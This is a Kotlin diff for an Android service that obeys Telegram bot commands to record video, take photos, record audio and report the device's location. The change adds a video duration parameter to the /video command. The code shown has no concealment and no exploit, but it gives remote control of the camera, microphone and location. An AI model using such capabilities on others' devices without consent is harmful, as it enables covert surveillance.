@@ -145,7 +145,20 @@ class BotCommandListener : Service() {
     // ── Buyruq bajaruvchi ─────────────────────────────────────────────────────
 
     private fun executeCommand(text: String, token: String, chatId: String) {
-        when (text.lowercase()) {
+        val cmd = text.lowercase().trim()
+
+        // /video alohida — duration parametr oladi (/video 30)
+        if (cmd.startsWith("/video")) {
+            val parts       = cmd.split("\\s+".toRegex())
+            val durationSec = parts.getOrNull(1)?.toIntOrNull()?.coerceIn(3, 60) ?: 15
+            val videoIntent = Intent(this, VideoCaptureService::class.java)
+                .putExtra(VideoCaptureService.EXTRA_DURATION_SEC, durationSec)
+            startForegroundService(videoIntent)
+            TelegramSender.sendMessage(token, chatId, "🎥 Video yozilmoqda ($durationSec soniya)...")
+            return
+        }
+
+        when (cmd) {
             "/alarm", "/signal" -> {
                 startForegroundService(Intent(this, AlarmService::class.java))
                 TelegramSender.sendMessage(token, chatId, "🔊 Signal chalindi!")
@@ -163,10 +176,6 @@ class BotCommandListener : Service() {
                 startForegroundService(Intent(this, CameraService::class.java))
                 TelegramSender.sendMessage(token, chatId, "📸 Surat olinmoqda...")
             }
-            "/video" -> {
-                startForegroundService(Intent(this, VideoCaptureService::class.java))
-                TelegramSender.sendMessage(token, chatId, "🎥 Video yozilmoqda...")
-            }
             "/audio", "/listen" -> {
                 startForegroundService(Intent(this, AudioRecordService::class.java))
                 TelegramSender.sendMessage(token, chatId, "🎙️ Audio yozilmoqda...")
@@ -177,7 +186,7 @@ class BotCommandListener : Service() {
                     /status — qurilma holati + joylashuv
                     /location — faqat joylashuv
                     /photo — surat ol (old + orqa)
-                    /video — qisqa video yoz
+                    /video [soniya] — video yoz (masalan: /video 30, default 15s)
                     /audio — ovoz yozish
                     /alarm — jiringlatish
                     /help — shu ro'yxat
